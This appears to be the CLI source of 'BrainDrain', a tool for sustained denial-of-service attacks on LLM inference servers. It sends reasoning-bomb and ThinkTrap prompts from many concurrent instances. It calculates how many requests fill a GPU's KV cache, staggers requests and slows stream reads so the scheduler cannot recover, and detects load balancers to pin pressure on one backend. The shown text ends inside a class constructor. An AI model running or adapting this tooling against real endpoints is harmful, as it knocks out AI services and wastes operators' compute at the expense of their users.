#!/usr/bin/env python3
"""
cli.py — BrainDrain unified attack CLI.

Interactive wizard → baseline probe → sustained attack with live probe monitoring.

Usage:
    python cli.py
"""
from __future__ import annotations

import asyncio
import json
import logging
import sys
import time
from typing import Any, Callable, Optional

import aiohttp

from core.base_attack import APIFormat, AttackStatus, BaseAttack, TargetConfig
from attacks.reasoning_bomb import ReasoningBombAttack, ReasoningBombConfig, PuzzleLoader
from attacks.think_trap import ThinkTrapAttack, ThinkTrapConfig
from orchestration.attacker_instance import AttackerInstance, AttackerInstanceConfig
from orchestration.registry import make_config_factory
from orchestration.result_collector import ResultCollector
from probes.itl_probes import InfraState, ITLProbes, ProbeConfig
from probes.kv_saturation_calculator import requests_to_fill_kv

try:
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.panel import Panel
    from rich.text import Text
    from rich import box
    _RICH = True
except ImportError:
    _RICH = False

console = Console() if _RICH else None

# ─────────────────────────────────────────────
# Logging setup
# ─────────────────────────────────────────────

def _setup_logging() -> None:
    """Route library warnings/errors to the terminal so silent failures are visible."""
    if _RICH:
        from rich.logging import RichHandler
        logging.basicConfig(
            level=logging.WARNING,
            format="%(message)s",
            handlers=[RichHandler(console=console, show_path=False, markup=False)],
        )
    else:
        logging.basicConfig(
            level=logging.WARNING,
            format="[%(name)s] %(levelname)s: %(message)s",
        )


# ─────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────

def _print(msg: str, style: str = "") -> None:
    if _RICH and console:
        console.print(msg, style=style)
    else:
        print(msg)


def _ask(prompt: str, default: Optional[str] = None) -> str:
    """Prompt the user; return stripped input or default if blank."""
    suffix = f" [{default}]" if default is not None else ""
    try:
        if _RICH and console:
            from rich.markup import escape as _escape
            # Print the prompt via console.print so Rich markup in `prompt`
            # (e.g. [bold]256[/bold] from _choose) is rendered correctly.
            # The default is escaped so brackets in file paths aren't parsed
            # as markup tags.  Plain input("") then reads the response.
            safe_suffix = f" \\[{_escape(default)}]" if default is not None else ""
            console.print(f"  {prompt}{safe_suffix}: ", end="")
            val = input("").strip()
        else:
            val = input(f"  {prompt}{suffix}: ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)
    return val if val else (default or "")


def _ask_int(prompt: str, default: int, min_val: int = 1) -> int:
    while True:
        raw = _ask(prompt, str(default))
        try:
            v = int(raw)
            if v >= min_val:
                return v
            _print(f"    Value must be >= {min_val}.", "yellow")
        except ValueError:
            _print("    Please enter an integer.", "yellow")


def _ask_float(prompt: str, default: float, min_val: float = 0.0) -> float:
    while True:
        raw = _ask(prompt, str(default))
        try:
            v = float(raw)
            if v >= min_val:
                return v
            _print(f"    Value must be >= {min_val}.", "yellow")
        except ValueError:
            _print("    Please enter a number.", "yellow")



def _choose(prompt: str, options: list[str], default: str) -> str:
    opts_str = " / ".join(
        f"[bold]{o}[/bold]" if o == default else o for o in options
    ) if _RICH else " / ".join(options)
    while True:
        raw = _ask(f"{prompt} ({opts_str})", default)
        if raw.lower() in [o.lower() for o in options]:
            return raw.lower()
        _print(f"    Choose one of: {', '.join(options)}", "yellow")


async def _ask_async(prompt: str, default: Optional[str] = None) -> str:
    """Non-blocking input() using run_in_executor so the event loop isn't blocked."""
    suffix = f" [{default}]" if default is not None else ""
    loop = asyncio.get_event_loop()
    raw = await loop.run_in_executor(None, input, f"  {prompt}{suffix}: ")
    raw = raw.strip()
    return raw if raw else (default or "")


# ─────────────────────────────────────────────
# Error classification
# ─────────────────────────────────────────────

# After this many consecutive FAILED results with the same category, pause and prompt.
RECOVERY_CONSECUTIVE = 10

def _classify_error(error: str) -> Optional[str]:
    """
    Map an error message to a recoverable category.
    Returns None if the error is unclassified / likely transient.
    """
    low = error.lower()
    if any(k in low for k in (
        "context length", "context window", "maximum context",
        "max_tokens", "max tokens", "token limit", "tokens exceed",
        "maximum length", "exceeds the maximum", "this model's maximum",
        "input is too long", "input length", "sequence length",
    )):
        return "token_limit"
    if any(k in low for k in (
        "http 401", "http 403", "unauthorized", "forbidden",
        "invalid api key", "authentication", "api key",
    )):
        return "auth"
    if any(k in low for k in (
        "http 404", "not found", "no such model",
        "model not found", "model does not exist",
    )):
        return "model_not_found"
    if any(k in low for k in (
        "http 429", "rate limit", "too many requests",
        "quota exceeded", "rate_limit",
    )):
        return "rate_limit"
    return None


# ─────────────────────────────────────────────
# Auto-detect max tokens from API
# ─────────────────────────────────────────────

async def try_fetch_context_length(target: TargetConfig) -> Optional[int]:
    """
    Detect the model's max context length by sending a request with a huge
    max_tokens value and parsing the limit out of the error message.
    Prints what the server responds so the user can see what's happening.
    """
    import re

    _PATTERNS = [
        r"max_total_tokens=(\d+)",                     # vLLM: max_model_len=max_total_tokens=N
        r"maximum context length is (\d+)",            # OpenAI style
        r"max_model_len \((\d+)\)",                    # vLLM style (parens)
        r"max_model_len=(\d+)",                        # vLLM style (equals)
        r"context_window.*?(\d{4,})",
        r"context.{0,20}length.{0,30}?(\d{4,})",
        r"maximum.{0,30}?(\d{4,})\s*tokens",
        r"(\d{4,})\s*tokens?.{0,20}(is|are) the max",
    ]

    endpoint = target.endpoint
    payload: dict = {
        "model":      target.model,
        "messages":   [{"role": "user", "content": "hi"}],
        "max_tokens": 10_000_000,
        "stream":     False,
    }

    try:
        timeout = aiohttp.ClientTimeout(total=8.0)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(
                endpoint,
                json=payload,
                headers={"Content-Type": "application/json", **target.auth_headers},
                ssl=target.verify_ssl,
            ) as resp:
                body = await resp.text()
                for pattern in _PATTERNS:
                    m = re.search(pattern, body, re.IGNORECASE)
                    if m:
                        return int(m.group(1))
                _print(
                    "  [yellow]No context length found in error body — enter manually.[/yellow]"
                    if _RICH else
                    "  No context length found in error body — enter manually."
                )
    except Exception as exc:
        _print(
            f"  [yellow]Probe request failed: {exc}[/yellow]"
            if _RICH else
            f"  Probe request failed: {exc}"
        )

    return None


# ─────────────────────────────────────────────
# Wizard: gather configs
# ─────────────────────────────────────────────

def gather_target_config() -> TargetConfig:
    _print("\n[bold #8B0000]── Target Configuration ──[/bold #8B0000]" if _RICH else "\n── Target Configuration ──")

    fmt_str = _choose(
        "API format",
        ["openai", "anthropic", "ollama", "vertex", "custom"],
        "openai",
    )

    if fmt_str == "custom":
        return _gather_custom_target()

    fmt_map = {
        "openai":    APIFormat.OPENAI,
        "anthropic": APIFormat.ANTHROPIC,
        "ollama":    APIFormat.OLLAMA,
        "vertex":    APIFormat.VERTEX,
    }
    api_format = fmt_map[fmt_str]

    if api_format == APIFormat.VERTEX:
        _print(
            "  [dim]Vertex AI (Google models): enter the full model path, e.g.\n"
            "  https://LOCATION-aiplatform.googleapis.com/v1/projects/PROJECT_ID/"
            "locations/LOCATION/publishers/google/models/MODEL\n"
            "  Example: https://us-central1-aiplatform.googleapis.com/v1/projects/my-project/"
            "locations/us-central1/publishers/google/models/gemini-2.5-pro\n"
            "  The model name is extracted from the URL automatically.\n"
            "  Use an OAuth2 access token (gcloud auth print-access-token) as the API key.[/dim]"
            if _RICH else
            "  Vertex AI (Google models): enter the full model path, e.g.\n"
            "  https://LOCATION-aiplatform.googleapis.com/v1/projects/PROJECT_ID/"
            "locations/LOCATION/publishers/google/models/MODEL\n"
            "  Example: https://us-central1-aiplatform.googleapis.com/v1/projects/my-project/"
            "locations/us-central1/publishers/google/models/gemini-2.5-pro\n"
            "  The model name is extracted from the URL automatically.\n"
            "  Use an OAuth2 access token (gcloud auth print-access-token) as the API key."
        )
        base_url = _ask("Vertex model URL")
        if not base_url.startswith("http"):
            base_url = "https://" + base_url
        for _action in (":streamGenerateContent", ":generateContent", ":predict"):
            if _action in base_url:
                base_url = base_url.split(_action)[0]
                break
        base_url = base_url.rstrip("/")
        model = base_url.split("/")[-1]
    else:
        base_url = _ask("Target URL / IP (e.g. http://1.2.3.4 or https://api.example.com)")
        if not base_url.startswith("http"):
            base_url = "http://" + base_url
        model = _ask("Model name (e.g. deepseek-r1-7b, gpt-4o)")

    api_key_raw = _ask(
        "OAuth2 access token" if api_format == APIFormat.VERTEX else "API key (leave blank if not required)"
    )
    api_key = api_key_raw if api_key_raw else None

    _timeout_raw = _ask("Request timeout (seconds, leave blank for no timeout)", "N/A")
    timeout_s: Optional[float] = None if _timeout_raw.upper() in ("N/A", "", "NONE") else float(_timeout_raw)

    supports_stream_options = True
    if api_format == APIFormat.OLLAMA:
        raw = _ask("Server supports stream_options (OpenAI >=1.x)? (y/n)", "y")
        supports_stream_options = raw.lower().startswith("y")

    return TargetConfig(
        base_url=base_url,
        model=model,
        api_format=api_format,
        api_key=api_key,
        timeout=timeout_s,
        supports_stream_options=supports_stream_options,
    )


def _gather_custom_target() -> TargetConfig:
    """
    Custom endpoint: user pastes a single JSON object describing the full request.

    Expected format:
        {
          "url": "https://...",
          "headers": { "Authorization": "Bearer ...", "anthropic-beta": "..." },
          "body": {
            "anthropic_version": "vertex-2023-10-16",
            "max_tokens": 16000,
            "messages": [{"role": "user", "content": "__PROMPT__"}]
          }
        }

    The tool replaces "__PROMPT__" with the attack prompt at runtime and injects
    "stream": true into the body. Everything else is sent exactly as provided.
    """
    _print(
        "  [dim]Custom mode: paste a complete request descriptor as JSON.\n"
        "  Format:\n"
        '    {\n'
        '      "url": "https://...",\n'
        '      "headers": { "Authorization": "Bearer ...", ... },\n'
        '      "body": { ..., "content": "__PROMPT__" }\n'
        '    }\n'
        '  Replace the message content field with [bold]"__PROMPT__"[/bold] — the tool injects the\n'
        '  attack prompt there. Everything else is sent exactly as you write it.\n'
        "  Paste the JSON, then press Enter on a blank line to finish.[/dim]"
        if _RICH else
        "  Custom mode: paste a complete request descriptor as JSON.\n"
        "  Format:\n"
        '    {\n'
        '      "url": "https://...",\n'
        '      "headers": { "Authorization": "Bearer ...", ... },\n'
        '      "body": { ..., "content": "__PROMPT__" }\n'
        '    }\n'
        '  Replace the message content field with "__PROMPT__" — the tool injects the\n'
        "  attack prompt there. Everything else is sent exactly as you write it.\n"
        "  Paste the JSON, then press Enter on a blank line to finish."
    )

    _print("  Paste request JSON (blank line to finish):" if not _RICH
           else "  Paste request JSON (blank line to finish):")
    lines = []
    while True:
        line = input("")
        if line == "" and lines:
            break
        lines.append(line)

    raw_json = "\n".join(lines).strip()
    try:
        descriptor = json.loads(raw_json)
    except json.JSONDecodeError as exc:
        _print(
            f"  [bold red]Invalid JSON: {exc}[/bold red]" if _RICH
            else f"  Invalid JSON: {exc}"
        )
        descriptor = {}

    schema = _choose(
        "Response stream format (for parsing only)",
        ["openai", "anthropic", "vertex", "ollama"],
        "openai",
    )
    schema_map = {
        "openai":    APIFormat.OPENAI,
        "anthropic": APIFormat.ANTHROPIC,
        "vertex":    APIFormat.VERTEX,
        "ollama":    APIFormat.OLLAMA,
    }
    api_format = schema_map[schema]

    model = _ask("Model name (for display/logging only)", "custom")
    _timeout_raw = _ask("Request timeout (seconds, leave blank for no timeout)", "N/A")
    timeout_s: Optional[float] = None if _timeout_raw.upper() in ("N/A", "", "NONE") else float(_timeout_raw)

    endpoint_url  = descriptor.get("url", "")
    extra_headers = {k: v for k, v in descriptor.get("headers", {}).items()
                     if k.lower() != "content-type"}  # content-type is set by the session
    body_template = descriptor.get("body")

    if not endpoint_url:
        _print("  [yellow]Warning: no 'url' found in descriptor.[/yellow]" if _RICH
               else "  Warning: no 'url' found in descriptor.")

    return TargetConfig(
        base_url=endpoint_url,
        model=model,
        api_format=api_format,
        api_key=None,               # auth is carried in extra_headers
        endpoint_path="",           # use url exactly as-is
        timeout=timeout_s,
        extra_headers=extra_headers,
        request_template=body_template,
    )


def _estimate_prompt_tokens(attack_type: str, extra: dict) -> int:
    """
    Rough token estimate for the attack prompt by loading the prompt file and
    measuring character count / 4 (a common chars-per-token approximation).
    Returns 0 if the file can't be loaded or parsed.
    """
    import json as _json
    try:
        if attack_type == "reasoning_bomb":
            path = extra.get("puzzle_file", "")
            tier = extra.get("budget_tier", "256")
            if not path:
                return 0
            with open(path, "r", encoding="utf-8") as fh:
                data = _json.load(fh)
            # Unwrap common wrapper keys
            for key in ("puzzles", "data", "samples", "dataset", "problems"):
                if key in data and isinstance(data[key], dict):
                    data = data[key]
                    break
            puzzles = data.get(tier, data.get(str(tier), []))
            if puzzles:
                sample = puzzles[0] if isinstance(puzzles[0], str) else str(puzzles[0])
                return max(len(sample) // 4, 1)

        elif attack_type == "think_trap":
            path = extra.get("prompts_file", "")
            if not path:
                return 0
            with open(path, "r", encoding="utf-8") as fh:
                data = _json.load(fh)
            prompts = data.get("prompts", [])
            if prompts:
                text = prompts[0].get("text", "")
                return max(len(text) // 4, 1)
    except Exception:
        pass
    return 0


def gather_attack_params(target: TargetConfig) -> dict:
    _print("\n[bold #8B0000]── Attack Configuration ──[/bold #8B0000]" if _RICH else "\n── Attack Configuration ──")

    attack_type = _choose(
        "Attack type",
        ["reasoning_bomb", "think_trap"],
        "reasoning_bomb",
    )

    n_instances = _ask_int("Number of concurrent attacker instances", default=4)

    _print("\n  [dim]Token budget: total tokens (completion + reasoning) the attack may generate.[/dim]" if _RICH
           else "\n  Token budget: total tokens (completion + reasoning) the attack may generate.")
    budget_raw = _ask("Token budget (leave blank for unlimited)")
    token_budget: Optional[int] = None
    if budget_raw:
        try:
            token_budget = int(budget_raw)
        except ValueError:
            pass

    extra: dict[str, Any] = {}

    if attack_type == "reasoning_bomb":
        puzzle_file = _ask("Path to puzzle JSON file", "prompts/reasoningBomb_puzzles.json")
        budget_tier = _choose("Puzzle budget tier", ["128", "256", "512", "mixed"], "256")
        extra["puzzle_file"] = puzzle_file
        extra["budget_tier"] = budget_tier

    elif attack_type == "think_trap":
        prompts_file = _ask("Path to ThinkTrap prompts JSON file", "prompts/thinktrap_prompts.json")
        extra["prompts_file"] = prompts_file

    # ── Determine prompt token cost, then probe for context limit ────────────
    if attack_type == "reasoning_bomb":
        raw_tier = extra.get("budget_tier", "0")
        estimated_prompt_tokens = max(int(t) for t in ["128", "256", "512"]) if raw_tier == "mixed" else int(raw_tier)
    else:
        estimated_prompt_tokens = _estimate_prompt_tokens(attack_type, extra)

    _print("  [dim]Probing server to detect max context length…[/dim]" if _RICH
           else "  Probing server to detect max context length…")
    detected = asyncio.run(_fetch_context_length_safe(target))
    if detected:
        usable = max(detected - estimated_prompt_tokens - 64, 1024)
        if estimated_prompt_tokens > 0:
            _print(
                f"  [green]Detected context length: {detected:,} tokens  "
                f"(prompt ≈ {estimated_prompt_tokens:,} tokens → "
                f"max_completion_tokens default: {usable:,})[/green]"
                if _RICH else
                f"  Detected context length: {detected:,} tokens  "
                f"(prompt ≈ {estimated_prompt_tokens:,} tokens → "
                f"max_completion_tokens default: {usable:,})"
            )
        else:
            _print(
                f"  [green]Detected max context length: {detected:,} tokens.[/green]"
                if _RICH else
                f"  Detected max context length: {detected:,} tokens."
            )
            usable = detected
        default_max = usable
    else:
        _print(
            "  [yellow]Could not detect context length — defaulting to 16384.[/yellow]"
            if _RICH else
            "  Could not detect context length — defaulting to 16384."
        )
        default_max = 16384

    max_tokens = _ask_int(
        "Max tokens per request (max_completion_tokens)",
        default=default_max,
    )

    # ── Sustained pressure options ────────────────────────────────────────────
    _print(
        "\n[bold #8B0000]── Sustained Pressure Options ──[/bold #8B0000]\n"
        "  These settings prevent simultaneous request completion (wave pattern)\n"
        "  which would briefly free the KV cache and let the scheduler recover.\n"
        if _RICH else
        "\n── Sustained Pressure Options ──\n"
        "  These settings prevent simultaneous request completion (wave pattern)\n"
        "  which would briefly free the KV cache and let the scheduler recover.\n"
    )

    _print(
        "  [dim]Launch stagger: delay between starting each instance so they\n"
        "  complete at different times. Rule of thumb: set to est_request_duration / n_instances.[/dim]"
        if _RICH else
        "  Launch stagger: delay between starting each instance so they\n"
        "  complete at different times. Rule of thumb: set to est_request_duration / n_instances."
    )
    launch_stagger_s = _ask_float("Launch stagger between instances (seconds, 0=off)", default=0.0)

    _print(
        "  [dim]Max-token spread: assign each instance a different max_tokens\n"
        "  (linearly distributed across ±spread%). Prevents synchronised completions\n"
        "  even after the initial stagger window has passed.[/dim]"
        if _RICH else
        "  Max-token spread: assign each instance a different max_tokens\n"
        "  (linearly distributed across ±spread%). Prevents synchronised completions\n"
        "  even after the initial stagger window has passed."
    )
    max_tokens_spread_pct = _ask_float("Max-token spread (%, 0=off, e.g. 25)", default=0.0, min_val=0.0)

    _print(
        "  [dim]Stream read delay: sleep between reading each streaming chunk.\n"
        "  Backs up the server output queue, extending effective KV block\n"
        "  occupancy beyond pure generation time. 0.005–0.02 s is a good range.[/dim]"
        if _RICH else
        "  Stream read delay: sleep between reading each streaming chunk.\n"
        "  Backs up the server output queue, extending effective KV block\n"
        "  occupancy beyond pure generation time. 0.005–0.02 s is a good range."
    )
    stream_read_delay_s = _ask_float("Stream read delay per chunk (seconds, 0=off)", default=0.0, min_val=0.0)

    skip_probing_raw = _choose("Enable ITL probing during attack?", ["y", "n"], "y")
    skip_probing = skip_probing_raw != "y"

    return {
        "attack_type":          attack_type,
        "n_instances":          n_instances,
        "token_budget":         token_budget,
        "max_tokens":           max_tokens,
        "launch_stagger_s":     launch_stagger_s,
        "max_tokens_spread_pct": max_tokens_spread_pct,
        "stream_read_delay_s":  stream_read_delay_s,
        "skip_probing":         skip_probing,
        "extra":                extra,
    }


async def _fetch_context_length_safe(target: TargetConfig) -> Optional[int]:
    try:
        return await try_fetch_context_length(target)
    except Exception:
        return None


# ─────────────────────────────────────────────
# KV saturation calculator
# ─────────────────────────────────────────────

def _run_kv_calculator() -> None:
    """Interactive wizard for the KV saturation calculator."""
    _print(
        "\n[bold #8B0000]── KV Cache Saturation Calculator ──[/bold #8B0000]"
        if _RICH else
        "\n── KV Cache Saturation Calculator ──"
    )
    _print(
        "  Estimates how many concurrent requests are needed to fill\n"
        "  the KV cache on a single GPU, forcing memory pressure.\n"
        if _RICH else
        "  Estimates how many concurrent requests are needed to fill\n"
        "  the KV cache on a single GPU, forcing memory pressure.\n"
    )

    _print("[bold]GPU / server config[/bold]" if _RICH else "GPU / server config")
    gpu_vram_gb          = _ask_float("GPU VRAM (GB)", default=96.0, min_val=1.0)
    model_weights_gb     = _ask_float("Model weights on-device (GB, after quantization)", default=14.0, min_val=0.1)
    gpu_mem_util         = _ask_float("GPU memory utilization fraction (e.g. 0.85)", default=0.85, min_val=0.01)
    activation_overhead_gb = _ask_float("Activation overhead (GB, vLLM default ~2)", default=2.0, min_val=0.0)

    _print("\n[bold]Model architecture[/bold]" if _RICH else "\nModel architecture")
    num_layers   = _ask_int("Number of layers", default=28)
    num_kv_heads = _ask_int("Number of KV heads (GQA heads, not Q heads)", default=4)
    head_dim     = _ask_int("Head dimension (hidden_size / num_q_heads)", default=128)
    dtype_bytes  = _ask_int("KV cache dtype bytes (2=fp16/bf16, 1=fp8)", default=2)

    _print("\n[bold]Request shape[/bold]" if _RICH else "\nRequest shape")
    prompt_tokens = _ask_int("Prompt tokens per request", default=256)
    max_tokens    = _ask_int("Max tokens per request", default=15000)

    _print("")
    try:
        n = requests_to_fill_kv(
            gpu_vram_gb=gpu_vram_gb,
            model_weights_gb=model_weights_gb,
            gpu_mem_util=gpu_mem_util,
            num_layers=num_layers,
            num_kv_heads=num_kv_heads,
            head_dim=head_dim,
            prompt_tokens=prompt_tokens,
            max_tokens=max_tokens,
            dtype_bytes=dtype_bytes,
            activation_overhead_gb=activation_overhead_gb,
            verbose=True,
        )
        _print(
            f"\n  [bold green]Requests to fill KV cache: {n}[/bold green]"
            if _RICH else
            f"\n  Requests to fill KV cache: {n}"
        )
        _print(
            f"  [dim]Set number of concurrent attacker instances to at least [bold]{n}[/bold] "
            f"to saturate the KV cache.[/dim]"
            if _RICH else
            f"  Set number of concurrent attacker instances to at least {n} "
            f"to saturate the KV cache."
        )
    except ValueError as exc:
        _print(
            f"  [bold red]Error: {exc}[/bold red]" if _RICH else f"  Error: {exc}"
        )


# ─────────────────────────────────────────────
# Load balancer test
# ─────────────────────────────────────────────

async def _run_lb_test(target: TargetConfig) -> None:
    """Run a load-balancer detection test and print results."""
    _print(
        "\n[bold #8B0000]── Load Balancer Detection ──[/bold #8B0000]"
        if _RICH else
        "\n── Load Balancer Detection ──"
    )
    _print(
        "  Sends pairs of identical long-prefix requests and checks whether\n"
        "  the second request gets an APC cache hit (TTFT drops significantly).\n"
        "  Consistent hits → same backend every time.\n"
        "  Few/no hits    → requests route to different backends.\n"
        if _RICH else
        "  Sends pairs of identical long-prefix requests and checks whether\n"
        "  the second request gets an APC cache hit (TTFT drops significantly).\n"
        "  Consistent hits → same backend every time.\n"
        "  Few/no hits    → requests route to different backends.\n"
    )

    n_pairs = _ask_int("Number of probe pairs", default=6)
    prompt_repeats = _ask_int(
        "Prompt repeat factor (higher = longer prefix, more visible cache hits)", default=12
    )

    cfg = ProbeConfig(
        target=target,
        max_probe_tokens=128,
        temperature=0.0,
    )
    probes = ITLProbes(cfg)

    _print("  Running warm-up requests…" if not _RICH else "  [dim]Running warm-up requests…[/dim]")
    try:
        result = await probes.load_balancer_probe(
            n_pairs=n_pairs,
            inter_pair_delay_s=0.5,
            n_warmup=3,
            prompt_repeats=prompt_repeats,
        )
    finally:
        await probes.close()

    if not result["success"]:
        _print(
            f"  [bold red]LB test failed: {result.get('error')}[/bold red]"
            if _RICH else
            f"  LB test failed: {result.get('error')}"
        )
        return

    errors = result.get("errors", [])
    if errors:
        _print(
            f"  [yellow]Warning: {len(errors)} probe pair(s) failed and were skipped:[/yellow]"
            if _RICH else
            f"  Warning: {len(errors)} probe pair(s) failed and were skipped:"
        )
        for e in errors:
            _print(f"    [dim]{e}[/dim]" if _RICH else f"    {e}")

    hit_rate   = result["cache_hit_rate"]
    same       = result["same_backend"]
    confidence = result["confidence"]
    verdict    = result["verdict"]
    med_ratio  = result["median_ttft_ratio"]

    verdict_style = "green" if same else "red"
    _print(
        f"\n  [bold {verdict_style}]Verdict: {verdict}[/bold {verdict_style}]\n"
        f"  Cache hit rate    : {hit_rate:.1%}  ({result['n_cache_hits']}/{result['n_pairs']} pairs)\n"
        f"  Median TTFT ratio : {med_ratio:.3f}×  (warm/cold — lower = stronger cache hit)\n"
        f"  Confidence        : {confidence}\n"
        if _RICH else
        f"\n  Verdict           : {verdict}\n"
        f"  Cache hit rate    : {hit_rate:.1%}  ({result['n_cache_hits']}/{result['n_pairs']} pairs)\n"
        f"  Median TTFT ratio : {med_ratio:.3f}×  (warm/cold — lower = stronger cache hit)\n"
        f"  Confidence        : {confidence}\n"
    )

    if same:
        _print(
            "  [bold green]Tip: set a system prompt to pin all attack and probe requests\n"
            "  to the same KV-cache slot via prefix-aware routing — this maximises\n"
            "  cache pressure on a single backend.[/bold green]"
            if _RICH else
            "  Tip: set a system prompt to pin all attack and probe requests\n"
            "  to the same KV-cache slot via prefix-aware routing — this maximises\n"
            "  cache pressure on a single backend."
        )

    if _RICH:
        t = Table.grid(padding=(0, 2))
        t.add_column(style="dim", width=6)
        t.add_column(justify="right", width=11)
        t.add_column(justify="right", width=11)
        t.add_column(justify="right", width=7)
        t.add_column(justify="center", width=5)
        console.print("  pair  cold_ttft   warm_ttft   ratio  hit", style="dim")
        for p in result["pairs"]:
            hit_text = Text("yes", style="green") if p["cache_hit"] else Text("no", style="red")
            t.add_row(
                str(p["pair"]),
                f"{p['ttft_cold_s']:.4f}s",
                f"{p['ttft_warm_s']:.4f}s",
                f"{p['ratio']:.3f}×",
                hit_text,
            )
        console.print(t)
    else:
        print(f"  {'pair':<5s} {'cold_ttft':>10s} {'warm_ttft':>10s} {'ratio':>7s} {'hit':>5s}")
        print(f"  {'─'*5} {'─'*10} {'─'*10} {'─'*7} {'─'*5}")
        for p in result["pairs"]:
            print(f"  {p['pair']:<5d} {p['ttft_cold_s']:>10.4f} {p['ttft_warm_s']:>10.4f} "
                  f"{p['ratio']:>7.3f} {'yes' if p['cache_hit'] else 'no':>5s}")


# ─────────────────────────────────────────────
# Build attack factory
# ─────────────────────────────────────────────


def build_attack_factory(
    attack_type: str,
    target: TargetConfig,
    max_tokens: int,
    extra: dict,
    n_puzzles: Optional[int] = None,
    instance_index: int = 0,
    stream_read_delay_s: float = 0.0,
) -> tuple[type[BaseAttack], Callable, dict]:
    """
    Returns (attack_cls, config_factory, extra_kwargs) for one instance.
    For reasoning_bomb, each instance gets a distinct puzzle index so
    concurrent requests don't share a prompt (avoids prefix-cache bypass).
    """
    config_factory = make_config_factory(
        target,
        max_tokens=max_tokens,
        stream_read_delay_s=stream_read_delay_s,
    )

    if attack_type == "reasoning_bomb":
        puzzle_file  = extra.get("puzzle_file", "prompts/reasoningBomb_puzzles.json")
        budget_tier  = extra.get("budget_tier", "256")
        if budget_tier == "mixed":
            tiers = ["128", "256", "512"]
            effective_tier = tiers[instance_index % len(tiers)]
        else:
            effective_tier = budget_tier
        puzzle_index = instance_index % n_puzzles if n_puzzles else None
        rb_cfg = ReasoningBombConfig(
            puzzle_file=puzzle_file,
            budget_tier=effective_tier,
            puzzle_index=puzzle_index,
        )
        return ReasoningBombAttack, config_factory, {"rb_config": rb_cfg}

    elif attack_type == "think_trap":
        prompts_file = extra.get("prompts_file", "prompts/thinktrap_prompts.json")
        tt_cfg = ThinkTrapConfig(prompts_file=prompts_file)
        return ThinkTrapAttack, config_factory, {"tt_config": tt_cfg}

    raise ValueError(f"Unknown attack type: {attack_type!r}")


# ─────────────────────────────────────────────
# Live status display
# ─────────────────────────────────────────────

class StatusDisplay:
    """Lightweight live status panel (rich or plain)."""

    def __init__(self) -> None:
        self._start         = time.time()
        self._state         = InfraState.UNKNOWN
        self._kv_est        = -1.0
        self._itl_ms        = 0.0
        self._ttft_s        = 0.0
        self._requests      = 0
        self._output_tokens = 0   # completion + reasoning tokens (used for budget)
        self._input_tokens  = 0   # prompt tokens
        self._budget        = None
        self._instances: int = 0
        self._errors        = 0
        self._last_error    = ""

    def update(
        self,
        *,
        state: Optional[InfraState] = None,
        kv_est: Optional[float] = None,
        itl_ms: Optional[float] = None,
        ttft_s: Optional[float] = None,
        requests: Optional[int] = None,
        output_tokens: Optional[int] = None,
        input_tokens: Optional[int] = None,
        budget: Optional[int] = None,
        instances: Optional[int] = None,
        errors: Optional[int] = None,
        last_error: Optional[str] = None,
    ) -> None:
        if state         is not None: self._state         = state
        if kv_est        is not None: self._kv_est        = kv_est
        if itl_ms        is not None: self._itl_ms        = itl_ms
        if ttft_s        is not None: self._ttft_s        = ttft_s
        if requests      is not None: self._requests      = requests
        if output_tokens is not None: self._output_tokens = output_tokens
        if input_tokens  is not None: self._input_tokens  = input_tokens
        if budget        is not None: self._budget        = budget
        if instances     is not None: self._instances     = instances
        if errors        is not None: self._errors        = errors
        if last_error    is not None: self._last_error    = last_error

    def render(self) -> Any:
        elapsed = time.time() - self._start
        kv_str = f"{self._kv_est:.3f}" if self._kv_est >= 0 else "n/a"
        out_str = (
            f"{self._output_tokens:,} / {self._budget:,}"
            if self._budget else f"{self._output_tokens:,}"
        )
        state_color = {
            InfraState.UNKNOWN:     "white",
            InfraState.IDLE:        "green",
            InfraState.FILLING:     "yellow",
            InfraState.SATURATED:   "red",
            InfraState.HOL_BLOCKED: "red",
            InfraState.THRASHING:   "magenta",
            InfraState.DEGRADED:    "orange3",
        }.get(self._state, "white")

        if _RICH:
            t = Table.grid(padding=(0, 2))
            t.add_column(style="dim", width=22)
            t.add_column()
            t.add_row("Elapsed",       f"{elapsed:.0f}s")
            t.add_row("Instances",     str(self._instances))
            t.add_row("Requests",      str(self._requests))
            t.add_row("Output tokens", out_str)
            t.add_row("Input tokens",  f"{self._input_tokens:,}")
            t.add_row("Infra state",   Text(self._state.value, style=state_color))
            t.add_row("KV est",      kv_str)
            t.add_row("Mean ITL",    f"{self._itl_ms:.1f} ms")
            t.add_row("TTFT",        f"{self._ttft_s:.3f} s")
            if self._errors:
                err_text = Text(f"{self._errors} failed", style="red")
                t.add_row("Errors", err_text)
                if self._last_error:
                    # Truncate to fit panel width
                    short = self._last_error[:60] + ("…" if len(self._last_error) > 60 else "")
                    t.add_row("Last error", Text(short, style="red dim"))
            return Panel(t, title="[bold]BrainDrain[/bold]", border_style="#8B0000")
        else:
            err_str = f" err={self._errors}" if self._errors else ""
            print(
                f"\r  [{elapsed:.0f}s] "
                f"inst={self._instances} reqs={self._requests} "
                f"out={out_str} in={self._input_tokens:,} "
                f"state={self._state.value} "
                f"kv={kv_str} itl={self._itl_ms:.1f}ms ttft={self._ttft_s:.3f}s{err_str}",
                end="", flush=True,
            )
            return None


# ─────────────────────────────────────────────
# Orchestrator
# ─────────────────────────────────────────────

class AttackOrchestrator:
    """
    Coordinates sustained attack instances + probe monitoring.

    Flow:
    1. calibrate_baseline()
    2. Launch N run_loop instances
    3. Run probe monitor in parallel (updates status + state timeline)
    4. Watch token budget — set stop_event when budget exhausted
    5. Watchdog: if an instance's task dies unexpectedly, restart it
    6. On Ctrl+C or budget exhaustion: stop cleanly and print summary
    """

    PROBE_INTERVAL_S = 10.0   # how often to fire a probe during the attack
    WATCHDOG_INTERVAL_S = 5.0 # how often to check for dead instances

    def __init__(
        self,
        target:               TargetConfig,
        attack_type:          str,
        n_instances:          int,
        max_tokens:           int,
        token_budget:         Optional[int],
        attack_extra:         dict,
        launch_stagger_s:     float = 0.0,
        max_tokens_spread_pct: float = 0.0,
        stream_read_delay_s:  float = 0.0,
        skip_probing:         bool  = False,
    ) -> None:
        self.target               = target
        self.attack_type          = attack_type
        self.n_instances          = n_instances
        self.max_tokens           = max_tokens
        self.token_budget         = token_budget
        self.attack_extra         = attack_extra
        self.launch_stagger_s     = launch_stagger_s
        self.max_tokens_spread_pct = max_tokens_spread_pct
        self.stream_read_delay_s  = stream_read_delay_s
